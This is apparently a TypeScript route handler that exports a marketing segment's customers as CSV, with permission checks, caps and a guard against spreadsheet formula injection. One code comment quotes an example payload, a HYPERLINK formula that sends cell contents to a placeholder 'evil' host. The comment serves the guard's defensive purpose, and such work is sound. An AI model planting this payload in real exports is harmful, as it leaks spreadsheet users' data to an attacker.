import { NextResponse } from 'next/server'
import type { EntityManager } from '@mikro-orm/postgresql'
import { getAuthFromRequest } from '@open-mercato/shared/lib/auth/server'
import { createRequestContainer } from '@open-mercato/shared/lib/di/container'
import { findWithDecryption } from '@open-mercato/shared/lib/encryption/find'
import { CustomerEntity } from '@open-mercato/core/modules/customers/data/entities'
import type { ConditionExpression } from '@open-mercato/core/modules/business_rules/lib/expression-evaluator'
import { MarketingSegment } from '../../../../data/entities.js'
import { REQUEST_MAX_CHECKED, resolveSegmentMembers } from '../../../../lib/segment-members.js'
import { readPathUuid } from '../../../shared.js'

/**
 * A segment's members as CSV.
 *
 * Requires `customers.people.view` on top of the marketing grant: this is a file of names and addresses, and
 * it is the most portable form customer data takes in this module. Capped rather than streamed — a cap is a
 * decision somebody can see in the response, whereas a stream that dies halfway produces a file that looks
 * complete.
 *
 * Two different caps, and they are not the same thing: `MAX_ROWS` bounds the FILE, and `REQUEST_MAX_CHECKED`
 * bounds the WORK. The work cap is the request-sized one rather than the job-sized `JOB_MAX_CHECKED` this
 * used to pass: membership is decided by building a subject document per candidate, so fifty thousand of
 * them is tens of thousands of sequential queries with a browser and a database connection both waiting.
 * Whether the file is everybody is reported either way, in the header below.
 */
const routeMetadata = {
  GET: {
    requireAuth: true,
    requireFeatures: ['marketing_automation.campaigns.view', 'customers.people.view'],
  },
}

export const metadata = routeMetadata

const MAX_ROWS = 10_000

/**
 * Quoting is not the only thing a CSV cell needs.
 *
 * `display_name` is customer-controlled — public sign-up accepts it — so a customer registering as
 * `=HYPERLINK("https://evil/?d="&A1,"x")` executes in whatever spreadsheet the operator opens this file with.
 * RFC 4180 quoting does nothing about that: the cell is a perfectly well-formed string that Excel and Sheets
 * both treat as a formula.
 *
 * The platform already solved this in `packages/shared/src/lib/crud/exporters.ts`; this module wrote its own
 * emitter and lost the guard with it. Prefixing an apostrophe is that file's answer and it is the standard one:
 * the cell displays unchanged and is never evaluated.
 */
const FORMULA_LEAD = /^[=+\-@\t\r\n]/

function csvCell(value: string | null): string {
  const raw = value ?? ''
  const text = FORMULA_LEAD.test(raw) ? `'${raw}` : raw
  if (!/[",\r\n]/.test(text)) return text
  return `"${text.replace(/"/g, '""')}"`
}

export async function GET(req: Request) {
  const auth = await getAuthFromRequest(req)
  if (!auth?.tenantId || !auth.orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

  const segmentId = readPathUuid(req, 2)
  if (!segmentId) return NextResponse.json({ error: 'Missing id' }, { status: 400 })

  const container = await createRequestContainer()
  const em = container.resolve<EntityManager>('em')
  const scope = { tenantId: auth.tenantId, organizationId: auth.orgId }

  const segment = await em.findOne(MarketingSegment, { id: segmentId, ...scope, deletedAt: null })
  if (!segment) return NextResponse.json({ error: 'Not found' }, { status: 404 })

  const resolution = await resolveSegmentMembers(
    em,
    container,
    scope,
    (segment.expression ?? null) as ConditionExpression | null,
    { maxChecked: REQUEST_MAX_CHECKED, maxMatches: MAX_ROWS },
  )

  const rows = resolution.ids.length > 0
    ? (await findWithDecryption(
        em,
        CustomerEntity,
        { id: { $in: resolution.ids }, ...scope, deletedAt: null },
        undefined,
        scope,
      )) as Array<{ id: string; displayName?: string | null; primaryEmail?: string | null }>
    : []
  const byId = new Map(rows.map((row) => [row.id, row]))

  const lines = ['customer_id,display_name,email']
  for (const id of resolution.ids) {
    const row = byId.get(id)
    lines.push([csvCell(id), csvCell(row?.displayName ?? null), csvCell(row?.primaryEmail ?? null)].join(','))
  }

  const filename = `segment-${segment.slug}.csv`
  return new NextResponse(`${lines.join('\r\n')}\r\n`, {
    headers: {
      'content-type': 'text/csv; charset=utf-8',
      'content-disposition': `attachment; filename="${filename}"`,
      // Never cached: it is a file of customer data, and an intermediary holding a copy is the problem.
      'cache-control': 'no-store',
      // Says plainly whether the file is everybody or a capped slice, without having to count the lines.
      'x-om-segment-export-complete': resolution.complete && resolution.ids.length < MAX_ROWS ? 'true' : 'false',
      // How much was examined to produce it, so "not complete" is a number rather than a shrug.
      'x-om-segment-export-checked': String(resolution.checked),
    },
  })
}

export const openApi = {
  GET: {
    summary: 'Export a segment as CSV',
    description:
      'Customer id, display name and email for the segment members, capped. The `x-om-segment-export-complete` header says whether the file is the whole segment. Requires `customers.people.view`, because it is a file of personal data.',
    tags: ['Marketing Automation'],
    responses: { 200: { description: 'text/csv' }, 404: { description: 'No such segment' } },
  },
}
